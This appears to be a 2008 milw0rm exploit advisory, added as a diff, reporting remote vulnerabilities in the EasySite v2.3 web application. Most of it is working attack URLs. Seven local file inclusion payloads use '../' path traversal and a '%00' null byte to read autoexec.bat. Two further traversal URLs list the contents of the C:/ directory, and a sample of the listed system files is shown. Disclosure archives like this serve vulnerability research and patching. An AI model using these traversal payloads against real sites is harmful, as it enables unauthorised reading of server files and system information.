@@ -1,0 +1,47 @@
+####################################################################
+[+] EasySite v2.3 Multiple Remote Vulnerabilities   
+[+] Discovered By SirGod                          
+[+] www.mortal-team.org                          
+[+] Greetz : E.M.I.N.E.M, Ras ,Puscas_marin ,ToxicBlood,MesSiAH,xZu,HrN
+####################################################################
+
+[+] Local File Inclusion
+
+http://localhost/www/index.php?module=Accueil&action=../../../../autoexec.bat%00
+http://localhost/modules/Module/index.php?module=../../../../autoexec.bat%00
+http://localhost/modules/Module/index.php?ss_module=../../../../autoexec.bat%00
+http://localhost/modules/Module/index.php?ss_action=../../../../autoexec.bat%00
+http://localhost/modules/Themes/index.php?ss_action=../../../../autoexec.bat%00
+http://localhost/modules/Themes/index.php?ss_module=../../../../autoexec.bat%00
+http://localhost/modules/Themes/index.php?module=../../../../autoexec.bat%00
+
+And many others...
+
+This will open autoexec.bat
+
+[+] Arbitrary View Folder Contents
+
+You can view the folder contents and the content of files view via LFI.
+
+    http://localhost/www/index.php?module=../../../
+
+    http://localhost/inc/vmenu.php?module=../../../
+
+This will open C:/ directory and will show all the files from C:/ .
+
+Example :
+
+    * BOOTSECT.BAK
+    * BcBtRmv.log
+    * IO.SYS
+    * MSDOS.SYS
+    * autoexec.bat
+    * bootmgr
+    * config.sys
+    * grldr
+    * hiberfil.sys
+    * pagefile.sys
+
+####################################################################
+
+# milw0rm.com [2008-08-21]
